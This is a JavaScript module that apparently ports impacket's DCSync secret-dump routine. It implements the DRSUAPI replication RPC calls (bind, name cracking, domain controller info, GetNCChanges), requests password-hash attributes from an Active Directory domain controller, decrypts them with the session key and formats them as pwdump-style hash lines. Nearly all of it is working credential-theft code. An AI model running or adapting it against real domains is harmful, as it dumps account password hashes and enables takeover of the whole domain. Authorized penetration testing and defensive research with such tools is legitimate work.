import { DceRpc } from './dcerpc.js';
import { concat } from '../ldap/ber.js';
import { md5 } from '../crypto/md5.js';
import { rc4 } from '../crypto/rc4.js';
import { Aes } from '../crypto/aes.js';
import { desDeobfuscate } from '../crypto/des.js';

export const DRSUAPI_UUID = 'e3514235-4b06-11d1-ab04-00c04fc2dcd2';
const OP = { DRS_BIND: 0, DRS_GET_NC_CHANGES: 3, DRS_CRACK_NAMES: 12, DRS_DOMAIN_CONTROLLER_INFO: 16 };

const EXOP_REPL_OBJ = 6;
const DRS_INIT_SYNC       = 0x00000020;
const DRS_WRIT_REP        = 0x00000010;
const DRS_NEVER_SYNCED    = 0x00200000;
const DRS_FULL_SYNC_NOW   = 0x00008000;
const DRS_SYNC_URGENT     = 0x00080000;

const DS_NT4_ACCOUNT_NAME = 2;
const DS_FQDN_1779_NAME   = 1;

const u16 = (n) => { const b = new Uint8Array(2); new DataView(b.buffer).setUint16(0, n, true); return b; };
const u32 = (n) => { const b = new Uint8Array(4); new DataView(b.buffer).setUint32(0, n >>> 0, true); return b; };
const u64lo = (n) => { const b = new Uint8Array(8); new DataView(b.buffer).setUint32(0, n >>> 0, true); return b; };

function wchar(s) {
  const b = new Uint8Array((s.length + 1) * 2);
  for (let i = 0; i < s.length; i++) { b[i * 2] = s.charCodeAt(i) & 0xff; b[i * 2 + 1] = s.charCodeAt(i) >> 8; }
  return b;
}

function align4(len) { return len + ((4 - len % 4) % 4); }

const OID_PREFIX_5 = new Uint8Array([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x14, 0x01, 0x04]);

// ATTIDs in PARTIAL_ATTR_VECTOR use LOCAL ids (lower 16 bits). Upper 16 bits
// are the PrefixTable index (0 for standard schema, no explicit prefix needed).
const ATTID = {
  SAM_ACCOUNT_NAME:        0x000000DD,
  UNICODE_PWD:             0x0000005A,
  DBCS_PWD:                0x00000037,
  NT_PWD_HISTORY:          0x0000005E,
  LM_PWD_HISTORY:          0x000000A0,
  SUPPLEMENTAL_CREDENTIALS:0x0000007D,
  OBJECT_SID:              0x00000092,
  USER_ACCOUNT_CONTROL:    0x00000008,
  USER_PRINCIPAL_NAME:     0x00000290,
  PRIMARY_GROUP_ID:        0x00000060,
};

const ATTID_LIST = Object.values(ATTID);

// DSNAME per MS-DRSR §5.55 with impacket's actual wire encoding:
//   StringName is a CONFORMANT (not conformant-varying) WCHAR array, so NDR
//   only emits max_count (hoisted) + data — no offset+actual_count header.
//   Includes optional 16-byte GUID for GUID-based replication targets.
function buildDsname(dn, guid = null) {
  const w = wchar(dn);                 // UTF-16LE + trailing null, 2*(len+1) bytes
  const chars = dn.length + 1;
  const wLen = chars * 2;
  const pad = (4 - wLen % 4) % 4;
  const structLen = 4 + 4 + 4 + 16 + 28 + 4 + wLen;  // includes hoisted max_count
  const body = new Uint8Array(4 + 4 + 4 + 16 + 28 + 4 + wLen + pad);
  const dv = new DataView(body.buffer);
  let off = 0;
  dv.setUint32(off, chars, true); off += 4;      // max_count (hoisted for WCHAR_ARRAY)
  dv.setUint32(off, structLen, true); off += 4;  // structLen
  dv.setUint32(off, 0, true); off += 4;          // SidLen = 0
  if (guid) body.set(guid, off);                 // Guid (16 bytes)
  off += 16;
  off += 28;                                      // Sid (28 zeros)
  dv.setUint32(off, dn.length, true); off += 4;  // NameLen (excludes null)
  body.set(w, off);                              // wchar data + align pad
  return body;
}

// SCHEMA_PREFIX_TABLE inline: PrefixCount(4) + pPrefixEntry_referent(4).
// Impacket sends 1 entry mapping index 0 → 1.2.840.113556.1.4 (Microsoft
// schema base OID). Without this the server can't interpret ATTIDs and
// returns empty attribute set even for successful EXOP.
function buildPrefixTableInline() {
  return concat([u32(1), u32(0x00020008)]);  // PrefixCount=1, pPrefixEntry non-null
}

// Deferred pointee for pPrefixEntry:
//   max_count(4) + { ndx(4) + prefix.length(4) + prefix.elements_ref(4) } +
//   deferred prefix elements: max_count(4) + 8-byte OID.
function buildPrefixTablePointee() {
  const OID_PREFIX = new Uint8Array([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x14, 0x01, 0x04]);
  return concat([
    u32(1),                    // max_count for PREFIX_TABLE_ENTRY[]
    u32(0),                    // ndx = 0
    u32(OID_PREFIX.length),    // prefix.length = 8
    u32(0x00020010),           // prefix.elements referent
    u32(OID_PREFIX.length),    // deferred: max_count for elements
    OID_PREFIX,
  ]);
}

// PARTIAL_ATTR_VECTOR_V1_EXT (pointee):
//   dwVersion(4) + dwReserved1(4) + cAttrs(4) + [conformant array header] + rgPartialAttr[cAttrs]
// As deferred pointee of a top-level pointer, the conformant array's max_count
// is hoisted BEFORE the struct fields.
function buildPartialAttrSet() {
  return concat([
    u32(ATTID_LIST.length),  // max_count for conformant array (hoisted)
    u32(1),                  // dwVersion
    u32(0),                  // dwReserved1
    u32(ATTID_LIST.length),  // cAttrs
    ...ATTID_LIST.map(a => u32(a)),
  ]);
}

export class Drsuapi {
  constructor(rpcOrTransceive, sessionKey) {
    if (typeof rpcOrTransceive === 'function') {
      this.rpc = new DceRpc(rpcOrTransceive);
      this._rpcBound = false;
    } else {
      this.rpc = rpcOrTransceive;
      this._rpcBound = true;
    }
    this.sessionKey = sessionKey;
    this.hDrs = null;
  }

  async bind() {
    if (!this._rpcBound) await this.rpc.bind(DRSUAPI_UUID, '4.0');

    const clientGuid = new Uint8Array(16);
    globalThis.crypto.getRandomValues(clientGuid);

    const extFlags = 0x04000000 | 0x01000000 | 0x00800000 | 0x00400000 | 0x00008000;
    const extInt = new Uint8Array(52);
    const edv = new DataView(extInt.buffer);
    edv.setUint32(0, extFlags, true);
    edv.setUint32(48, 127, true);

    const stub = concat([
      u32(0x00020000), clientGuid,
      u32(0x00020004),
      u32(52), u32(52), extInt,
    ]);

    const out = await this.rpc.call(OP.DRS_BIND, stub);
    const dv = new DataView(out.buffer, out.byteOffset, out.byteLength);
    const status = dv.getUint32(out.length - 4, true);
    if (status) throw new Error(`DRSBind failed: 0x${status.toString(16)}`);

    // DRSBind response NDR layout:
    //   ppextServer referent (4)
    //   DRS_EXTENSIONS struct: max_count(4) + cb(4) + rgb[cb] + pad_to_4
    //   phDrs = 20-byte context handle
    //   ErrorCode (4) at end
    let pos = 0;
    const extRef = dv.getUint32(pos, true); pos += 4;
    if (extRef) {
      const maxCount = dv.getUint32(pos, true); pos += 4;
      const cb = dv.getUint32(pos, true); pos += 4;
      pos += cb;
      pos += (4 - pos % 4) % 4;
    }
    this.hDrs = out.slice(pos, pos + 20);
    return this.hDrs;
  }

  async crackNames(name, formatOffered = DS_NT4_ACCOUNT_NAME, formatDesired = DS_FQDN_1779_NAME) {
    // DRS_MSG_CRACKREQ_V1 with 1 name:
    //   Inline: CodePage(4)+LocaleId(4)+dwFlags(4)+formatOffered(4)+formatDesired(4)
    //           +cNames(4)+rpNames_referent(4)
    //   Deferred rpNames pointee: max_count(4) + [LPWSTR referent(4)]
    //   Deferred LPWSTR string: max_count(4)+offset(4)+actual_count(4)+wchar+pad
    const nameW = wchar(name);          // UTF-16LE + null, (name.length+1)*2 bytes
    const chars = name.length + 1;
    const wLen = chars * 2;
    const pad = (4 - wLen % 4) % 4;
    const namePadded = new Uint8Array(wLen + pad);
    namePadded.set(nameW);

    const stub = concat([
      this.hDrs,
      u32(1),                    // dwInVersion
      u32(1),                    // pmsgIn tag = V1
      // V1 inline:
      u32(0),                    // CodePage
      u32(0),                    // LocaleId
      u32(0),                    // dwFlags
      u32(formatOffered),
      u32(formatDesired),
      u32(1),                    // cNames
      u32(0x00020000),           // rpNames referent
      // rpNames pointee (deferred):
      u32(1),                    // max_count for LPWSTR array
      u32(0x00020004),           // LPWSTR[0] referent
      // LPWSTR[0] pointee (deferred):
      u32(chars),                // max_count for wchar array
      u32(0),                    // offset
      u32(chars),                // actual_count
      namePadded,                // wchar data + align pad
    ]);

    const out = await this.rpc.call(OP.DRS_CRACK_NAMES, stub);
    const dv = new DataView(out.buffer, out.byteOffset, out.byteLength);
    const status = dv.getUint32(out.length - 4, true);
    if (status) throw new Error(`DRSCrackNames failed: 0x${status.toString(16)}`);

    return this._parseCrackReply(out);
  }

  _parseCrackReply(buf) {
    let pos = 0;
    const dv = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
    const outVer = dv.getUint32(pos, true); pos += 4;
    const tag = dv.getUint32(pos, true); pos += 4;
    const resultRef = dv.getUint32(pos, true); pos += 4;
    if (!resultRef) return [];

    const cItems = dv.getUint32(pos, true); pos += 4;
    const itemsRef = dv.getUint32(pos, true); pos += 4;
    if (!itemsRef) return [];

    const maxCount = dv.getUint32(pos, true); pos += 4;
    const results = [];
    const itemPositions = [];
    for (let i = 0; i < cItems; i++) {
      const st = dv.getUint32(pos, true); pos += 4;
      const domRef = dv.getUint32(pos, true); pos += 4;
      const nameRef = dv.getUint32(pos, true); pos += 4;
      itemPositions.push({ st, domRef, nameRef });
    }
    for (const item of itemPositions) {
      let domain = '', name = '';
      if (item.domRef) {
        const mc = dv.getUint32(pos, true); pos += 4;
        const off = dv.getUint32(pos, true); pos += 4;
        const ac = dv.getUint32(pos, true); pos += 4;
        for (let j = 0; j < ac; j++) {
          const c = dv.getUint16(pos, true); pos += 2;
          if (c) domain += String.fromCharCode(c);
        }
        pos += (4 - pos % 4) % 4;
      }
      if (item.nameRef) {
        const mc = dv.getUint32(pos, true); pos += 4;
        const off = dv.getUint32(pos, true); pos += 4;
        const ac = dv.getUint32(pos, true); pos += 4;
        for (let j = 0; j < ac; j++) {
          const c = dv.getUint16(pos, true); pos += 2;
          if (c) name += String.fromCharCode(c);
        }
        pos += (4 - pos % 4) % 4;
      }
      results.push({ status: item.st, domain, name });
    }
    return results;
  }

  // DRSDomainControllerInfo (opnum 16) — returns NtdsDsaObjectGuid needed for
  // DRSGetNCChanges uuidDsaObjDest field. Impacket does this immediately after
  // DRSBind and caches the result.
  async getDomainControllerInfo(domain) {
    const domW = wchar(domain);
    const chars = domain.length + 1;
    const wLen = chars * 2;
    const pad = (4 - wLen % 4) % 4;
    const domPadded = new Uint8Array(wLen + pad);
    domPadded.set(domW);
    // DRS_MSG_DCINFOREQ_V1: Domain (LPWSTR) + InfoLevel (DWORD)
    // LPWSTR = pointer to conformant varying wstring
    const stub = concat([
      this.hDrs,
      u32(1),                     // dwInVersion
      u32(1),                     // pmsgIn tag
      u32(0x00020000),            // Domain referent
      u32(2),                     // InfoLevel = 2 (returns NtdsDsaObjectGuid)
      // Deferred Domain pointee: max_count(4) + offset(4) + actual_count(4) + wstring
      u32(chars),
      u32(0),
      u32(chars),
      domPadded,
    ]);
    const out = await this.rpc.call(OP.DRS_DOMAIN_CONTROLLER_INFO, stub);
    const dv = new DataView(out.buffer, out.byteOffset, out.byteLength);
    const status = dv.getUint32(out.length - 4, true);
    if (status) throw new Error(`DRSDomainControllerInfo failed: 0x${status.toString(16)}`);
    // Response layout for 1 DC returned:
    //   pdwOutVersion(4) + pmsgOut{tag(4) + cItems(4) + rItems_ref(4) +
    //   max_count(4) + item struct inline(104)} + deferred LPWSTRs + ErrorCode(4).
    // DS_DOMAIN_CONTROLLER_INFO_2W struct inline (104 bytes):
    //   7 pointers(28) + 3 BOOLs(12) + SiteObjectGuid(16) + ComputerObjectGuid(16)
    //   + ServerObjectGuid(16) + NtdsDsaObjectGuid(16)
    // So NtdsDsaObjectGuid = response_start + 20 + 88 = offset 108.
    const guid = out.slice(108, 124);
    return guid;
  }

  async getNCChanges(dn, guid = null) {
    // For GUID-based lookup impacket sends empty StringName ('\0' only).
    const effectiveDn = guid ? '' : dn;
    const dsname = buildDsname(effectiveDn, guid);
    const nullGuid = new Uint8Array(16);
    // Impacket uses the DC's NtdsDsaObjectGuid for uuidDsaObjDest and
    // uuidInvocIdSrc. Server checks these against a registered DSA — random
    // GUIDs get EXOP_ERR_NO_SUCH_OBJ. Fetch via DRSDomainControllerInfo.
    const dsaGuid = this.dsaGuid || new Uint8Array(16);

    // Match impacket exactly for -just-dc-user secret dump:
    //   ulFlags = 0x30 (DRS_SYNC_ALL | DRS_DEL_REF), cMaxObjects = 1,
    //   pUpToDateVecDest = NULL, PrefixTable = empty (Count=0, entry=null).
    const flags = 0x30;
    const partialAttrSet = buildPartialAttrSet();
    const prefixTableInline = buildPrefixTableInline();
    const prefixTablePointee = buildPrefixTablePointee();

    const stub = concat([
      this.hDrs,               // DRS_HANDLE (20)
      u32(8),                  // dwInVersion @ 20
      u32(8),                  // pmsgIn tag @ 24
      new Uint8Array([0xAB, 0xAB, 0xAB, 0xAB]),  // pad @ 28

      // === V8 struct inline @ 32 ===
      dsaGuid,                 // uuidDsaObjDest (16) @ 32
      dsaGuid,                 // uuidInvocIdSrc (16) @ 48
      u32(0x00020000),         // pNC referent @ 64
      new Uint8Array([0xAB, 0xAB, 0xAB, 0xAB]),  // pad @ 68 for usnvec
      u64lo(0), u64lo(0), u64lo(0),  // usnvecFrom (24) @ 72
      u32(0),                  // pUpToDateVecDest = NULL @ 96
      u32(flags),              // ulFlags @ 100
      u32(1),                  // cMaxObjects = 1 @ 104
      u32(0),                  // cMaxBytes @ 108
      u32(EXOP_REPL_OBJ),      // ulExtendedOp @ 112
      new Uint8Array([0xAB, 0xAB, 0xAB, 0xAB]),  // pad @ 116
      u64lo(0),                // liFsmoInfo @ 120
      u32(0x00020004),         // pPartialAttrSet referent @ 128
      u32(0),                  // pPartialAttrSetEx1 = null @ 132
      prefixTableInline,       // PrefixCount + pPrefixEntry ref @ 136

      // === deferred pointees (in declaration order, skip nulls) ===
      dsname,                  // pNC pointee
      partialAttrSet,          // pPartialAttrSet pointee
      prefixTablePointee,      // pPrefixEntry pointee (from PrefixTable)
    ]);

    const out = await this.rpc.call(OP.DRS_GET_NC_CHANGES, stub);
    const dv = new DataView(out.buffer, out.byteOffset, out.byteLength);
    const retStatus = dv.getUint32(out.length - 4, true);
    if (retStatus) throw new Error(`DRSGetNCChanges failed: 0x${retStatus.toString(16)}`);

    return this._parseGetNCChangesReply(out);
  }

  _parseGetNCChangesReply(buf) {
    const dv = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
    let pos = 0;

    const outVer = dv.getUint32(pos, true); pos += 4;
    const tag = dv.getUint32(pos, true); pos += 4;

    pos += 16;   // uuidDsaObjSrc
    pos += 16;   // uuidInvocIdSrc

    const pNCRef = dv.getUint32(pos, true); pos += 4;
    pos += 4;    // NDR 8-align pad before usnvecFrom

    pos += 24;   // usnvecFrom
    pos += 24;   // usnvecTo

    const pUpToDateRef = dv.getUint32(pos, true); pos += 4;

    const prefixCount = dv.getUint32(pos, true); pos += 4;
    const prefixRef = dv.getUint32(pos, true); pos += 4;

    const ulExtendedRet = dv.getUint32(pos, true); pos += 4;
    const cNumObjects = dv.getUint32(pos, true); pos += 4;
    const cNumBytes = dv.getUint32(pos, true); pos += 4;
    const pObjectsRef = dv.getUint32(pos, true); pos += 4;
    const fMoreData = dv.getUint32(pos, true); pos += 4;
    const cNumNcSizeObjects = dv.getUint32(pos, true); pos += 4;
    const cNumNcSizeValues = dv.getUint32(pos, true); pos += 4;
    const cNumValues = dv.getUint32(pos, true); pos += 4;
    const rgValuesRef = dv.getUint32(pos, true); pos += 4;
    const dwDRSError = dv.getUint32(pos, true); pos += 4;   // was missing!

    // Deferred pointees start here.
    if (pNCRef) {
      const maxCount = dv.getUint32(pos, true);
      const structLen = dv.getUint32(pos + 4, true);
      pos += 4;  // hoisted max_count
      pos += structLen;  // full struct
      pos += (4 - pos % 4) % 4;
    }

    if (pUpToDateRef) {
      pos = this._skipUpToDate(buf, pos, dv);
    }

    const prefixMap = {};
    if (prefixRef && prefixCount > 0) {
      const mc = dv.getUint32(pos, true); pos += 4;
      const entries = [];
      for (let i = 0; i < prefixCount; i++) {
        const ndx = dv.getUint32(pos, true); pos += 4;
        const oidLen = dv.getUint32(pos, true); pos += 4;
        const oidRef = dv.getUint32(pos, true); pos += 4;
        entries.push({ ndx, oidLen, oidRef });
      }
      for (let i = 0; i < entries.length; i++) {
        const e = entries[i];
        if (e.oidRef) {
          const mc2 = dv.getUint32(pos, true); pos += 4;
          if (mc2 > 200 || pos + mc2 > buf.length) {
            break;
          }
          const oidBytes = buf.slice(pos, pos + mc2);
          pos += mc2;
          pos += (4 - pos % 4) % 4;
          prefixMap[e.ndx] = oidBytes;
        }
      }
    }

    const attributes = {};
    if (pObjectsRef && cNumObjects > 0) {
      pos = this._parseReplEntInfList(buf, pos, dv, attributes, cNumObjects);
    }

    return { attributes, prefixMap, cNumObjects, fMoreData };
  }

  _skipUpToDate(buf, pos, dv) {
    const version = dv.getUint32(pos, true); pos += 4;
    pos += 4;
    const cNumCursors = dv.getUint32(pos, true); pos += 4;
    pos += 4;
    pos += cNumCursors * 32;
    return pos;
  }

  _parseReplEntInfList(buf, pos, dv, attributes, count) {
    // REPLENTINFLIST inline fields:
    //   pNextEntInf ref (4)
    //   ENTINF: pName ref (4) + ulFlags (4) + AttrBlock{attrCount(4) + pAttr ref(4)}
    //   fIsNCPrefix (4)
    //   pParentGuid ref (4)
    //   pMetaDataExt ref (4)
    for (let obj = 0; obj < count; obj++) {
      const pNextRef = dv.getUint32(pos, true); pos += 4;
      const pNameRef = dv.getUint32(pos, true); pos += 4;
      const ulFlags = dv.getUint32(pos, true); pos += 4;
      const attrCount = dv.getUint32(pos, true); pos += 4;
      const pAttrRef = dv.getUint32(pos, true); pos += 4;
      const fIsNCPrefix = dv.getUint32(pos, true); pos += 4;
      const pParentGuidRef = dv.getUint32(pos, true); pos += 4;
      const pMetaRef = dv.getUint32(pos, true); pos += 4;

      if (pNameRef) {
        const maxCount = dv.getUint32(pos, true);
        const structLen = dv.getUint32(pos + 4, true);
        pos += 4 + structLen;
        pos += (4 - pos % 4) % 4;
      }

      if (pAttrRef && attrCount > 0) {
        const mc = dv.getUint32(pos, true); pos += 4;
        const attrHeaders = [];
        for (let i = 0; i < attrCount; i++) {
          const attrTyp = dv.getUint32(pos, true); pos += 4;
          const valCount = dv.getUint32(pos, true); pos += 4;
          const pAValRef = dv.getUint32(pos, true); pos += 4;
          attrHeaders.push({ attrTyp, valCount, pAValRef });
        }
        // Deferred: for each ATTR with non-null pAValRef, its ATTRVAL_ARRAY pointee.
        for (const ah of attrHeaders) {
          if (ah.pAValRef && ah.valCount > 0) {
            const valMc = dv.getUint32(pos, true); pos += 4;
            const valHeaders = [];
            for (let v = 0; v < ah.valCount; v++) {
              const valLen = dv.getUint32(pos, true); pos += 4;
              const pValRef = dv.getUint32(pos, true); pos += 4;
              valHeaders.push({ valLen, pValRef });
            }
            // Deferred value bytes are CONFORMANT byte arrays (max_count + data),
            // NOT conformant-varying.
            for (const vh of valHeaders) {
              if (vh.pValRef && vh.valLen > 0) {
                const mc2 = dv.getUint32(pos, true); pos += 4;
                const valData = new Uint8Array(buf.slice(pos, pos + mc2));
                pos += mc2;
                pos += (4 - pos % 4) % 4;
                if (!attributes[ah.attrTyp]) attributes[ah.attrTyp] = valData;
              }
            }
          }
        }
      }

      if (pParentGuidRef) pos += 16;  // GUID

      if (pMetaRef) {
        const metaCAttrs = dv.getUint32(pos, true); pos += 4;
        pos += 4;
        pos += metaCAttrs * 32;
      }
    }
    return pos;
  }

  decryptSecret(encData) {
    if (!encData || encData.length < 20) return null;
    // ENCRYPTED_PAYLOAD per MS-DRSR §5.16.1.2:
    //   Salt (16 bytes) + CheckSum (4 bytes) + EncryptedData (rest)
    // Decryption:
    //   key = MD5(sessionKey || Salt)
    //   plaintext = RC4(key, EncryptedData)
    //   plaintext[0..3] = expected CRC32 of plaintext[4:] — first 4 stripped
    // Per MS-DRSR (as impacket implements): Salt(16 cleartext) then EncryptedData
    // (rest = ciphertext). Plaintext = RC4(MD5(sessionKey||Salt), ciphertext),
    // whose first 4 bytes are a CRC32 (verified elsewhere) and rest is the value.
    const salt = encData.slice(0, 16);
    const blob = encData.slice(16);
    const key = md5(concat([this.sessionKey, salt]));
    const dec = rc4(key, blob);
    return dec.slice(4);
  }

  extractHash(decrypted) {
    if (!decrypted || decrypted.length < 16) return null;
    return decrypted;
  }
}

export function formatDcsyncEntry(samName, rid, ntHash, lmHash) {
  const ntHex = ntHash ? toHex(ntHash) : '31d6cfe0d16ae931b73c59d7e0c089c0';
  const lmHex = lmHash ? toHex(lmHash) : 'aad3b435b51404eeaad3b435b51404ee';
  return `${samName}:${rid}:${lmHex}:${ntHex}:::`;
}

function toHex(buf) {
  return Array.from(buf, b => b.toString(16).padStart(2, '0')).join('');
}

function parseSid(buf) {
  if (!buf || buf.length < 8) return '';
  const rev = buf[0], count = buf[1];
  let auth = 0;
  for (let i = 2; i < 8; i++) auth = auth * 256 + buf[i];
  const subs = [];
  const dv = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
  for (let i = 0; i < count && 8 + i * 4 + 4 <= buf.length; i++) {
    subs.push(dv.getUint32(8 + i * 4, true));
  }
  return `S-${rev}-${auth}-${subs.join('-')}`;
}

export function extractRidFromSid(sidBuf) {
  if (!sidBuf || sidBuf.length < 12) return 0;
  const dv = new DataView(sidBuf.buffer, sidBuf.byteOffset, sidBuf.byteLength);
  const count = sidBuf[1];
  if (count < 1) return 0;
  return dv.getUint32(8 + (count - 1) * 4, true);
}

export function parseSamAccountName(buf) {
  if (!buf || buf.length < 2) return '';
  let s = '';
  const dv = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
  for (let i = 0; i + 1 < buf.length; i += 2) {
    const c = dv.getUint16(i, true);
    if (c === 0) break;
    s += String.fromCharCode(c);
  }
  return s;
}

export { ATTID };
